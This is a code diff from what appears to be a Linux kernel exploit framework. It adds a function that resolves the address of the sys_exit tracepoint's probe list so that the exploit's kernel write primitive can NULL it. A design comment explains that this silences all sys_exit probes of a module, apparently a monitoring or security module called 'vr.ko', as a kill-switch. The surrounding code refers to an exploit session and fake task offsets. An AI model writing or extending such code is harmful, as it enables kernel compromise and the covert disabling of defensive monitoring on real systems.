@@ -102,6 +102,26 @@ namespace ghostlock::profile {
             ghostlock::kernel::SLIDE_SYSCTL_BOOTID_OFF);
     }
 
+    /* Optional vr.ko global kill-switch target: &__tracepoint_sys_exit->funcs,
+     * already resolved to a final image offset by the profile extractor.
+     * Returns 0 (disabled) when the loaded profile does not provide the
+     * offset — unlike the accessors above there is no compile-time fallback,
+     * because writing a guessed tracepoint address would hit unrelated state.
+     * Resolved through the direct-map alias like the other data targets.
+     * Design note (PR #241): the original proposal redirected individual vr
+     * probe entries to a no-op probestub via a resident kernel-read channel;
+     * this tree's primitives are write-only, so the funcs *pointer* is NULLed
+     * instead — __DO_TRACE guards its loop with `if (it_func_ptr)`, making
+     * every sys_exit probe a safe no-op without knowing any probe address. */
+    inline uintptr_t sys_exit_tp_funcs() {
+        const kernel_offsets *values = ghostlock::session::g_exploit_session.profile.values();
+        if (!values || values->offsets.sys_exit_tp_funcs == 0) {
+            return 0;
+        }
+        return ghostlock::session::g_exploit_session.addresses.data_alias(
+            values->offsets.sys_exit_tp_funcs);
+    }
+
     inline uint32_t fake_task_prio_off() {
         return symbol_u32([](const kernel_offsets &v) { return v.task.prio; }, 0x94);
     }
